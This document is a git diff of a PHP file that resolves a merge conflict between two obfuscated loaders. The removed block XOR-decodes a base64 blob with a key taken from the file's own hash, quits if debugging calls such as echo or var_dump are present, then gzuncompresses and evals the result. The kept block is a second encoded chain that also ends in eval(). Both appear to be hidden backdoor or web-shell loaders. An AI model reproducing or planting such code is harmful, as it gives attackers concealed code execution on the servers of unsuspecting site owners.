@@ -1,29 +1,4 @@
 <?php
-<<<<<<< Updated upstream
-$dlngngfhp="512786e29049697d7f9df15665b25806";
-$tumzcp="0205000408575c060c04550f005a015007005c5d5f06075050045002565e5152";
-$vxvsxdt="T+5HZ10O4wQlyu/ySVuXnn42HeidSittzpRrdbakJTySvZD5PSZa+a34F4yUyslJRjj/eaCytpS6Qv2t/NVMjCFhcBC06h1NLdvloA2tZ563Vvexezqo6wCS5V5UfbHiRngH1zGJ+XBBqiwMcnVjT5UX/oh7gX8eZ15EInEolkwW7l+EmQEo4VkTTYfhD3KoGvOsL5PPmDfKJG5i5l+1CMsBVoCilbCHPQLIvpphfnd0j91AjRfrE9CXqLJsAVsCnQdOdU0EOfMoYHW/DPaUUNQskjXGD3aDvd/r3urxCvGuW+S4Y8yFo83kKpkxtJ55jW7gP9qCkKnOW4+mM7OOnp4H7pO+gzL6qL4IYR1vWLfBZMdX4rSG/Uyl8H6D9mS70YeJ786JEUYGry33kEp+VQZTJ8/app8rn4X55iSSuJgdrPHWf6Lq+OGNa/THctNCQlE8+d5JmaS7cNtjgiYJmBrDbDboZyXT2cVbbhpq+0gUTX20uSclGrk2kHx555IXREZgkj2UwhhpjFGyiDiBzGhNy/KtkRg1u2UC4TzeRs84Nsdq6DBdgaOQIXzz4LvhW01IADOQZq78ha9Po9mblJ7rDWoOCpgON4syok2EAhkLbfZQIfslVv8fVMnT+wPyad2HNEYLF+hq6J8+dBNwKuj5vsvHGIlKPIFoe6GwBYF2mIVvFXkI/ngVyJzLhyMoRxM/6QReqjtXY0lJarmEi/Yjgnx5VrCn5D+C6l6YMo6VeWCtzlRSFPhuYQ/Yw5TvamvK+cTo6e8UYJpKnRRtCCGtJk9AFSZnGTlmetkZ9ZxVGiaNi8PlF0q9VAV9y69P/E+TYZ4iYiM65C2SBaWdmTQtx0Bq";
-$qfexkvjt=file_get_contents(__FILE__);
-$lmwrvoqaky=str_replace($vxvsxdt,"",$qfexkvjt);
-if(strpos($lmwrvoqaky,"ec"."ho")!==false||strpos($lmwrvoqaky,"pr"."int")!==false||strpos($lmwrvoqaky,"var_"."dump")!==false||strpos($lmwrvoqaky,"file_put_"."contents")!==false||strpos($lmwrvoqaky,"fw"."rite")!==false){die();}
-$jgutavixu=str_replace(array($dlngngfhp,$tumzcp),array("SP_7123e757","KP_15bc4a22"),$qfexkvjt);
-$bgxjpb=md5($jgutavixu);
-$vwunde=hex2bin($tumzcp);
-$srhnwafu="";
-$zemsbxrbz=strlen($bgxjpb);
-for($ewlxlfu=0;$ewlxlfu<$zemsbxrbz;$ewlxlfu++){
-$srhnwafu.=chr(ord($vwunde[$ewlxlfu])^ord($bgxjpb[$ewlxlfu]));
-}
-$zsaecmcqu=base64_decode($vxvsxdt);
-$vztsdpekg=strlen($zsaecmcqu);
-$vussydfbv="";
-$jdizvdv=strlen($srhnwafu);
-for($ewlxlfu=0;$ewlxlfu<$vztsdpekg;$ewlxlfu++){
-$vussydfbv.=$zsaecmcqu[$ewlxlfu]^$srhnwafu[$ewlxlfu%$jdizvdv];
-}
-$ngklzfhqhm="gzun"."compress";
-eval($ngklzfhqhm($vussydfbv));
-=======
 // 14dbfe93e5fc6bc967dbdd0a
 $KoDNRBEsSBfPr="xoId8o7MWxD3p9axNe7au6hgoMb4RRvm98PTXpC6XC4=";
 $iRGPqLXnouU="kbVq8b7ZJkQ3c9nkAr7nh6utbZo4EEiz98CGKcP6KP4=";
@@ -52,4 +27,3 @@ $kpagUgkLD=$PJRyOKCvwHr($kpagUgkLD);
 $kpagUgkLD=$kpILbmmpBP($kpagUgkLD);
 $kpagUgkLD=$TTNNpilPMD($kpagUgkLD);
 eval($kpagUgkLD);
->>>>>>> Stashed changes
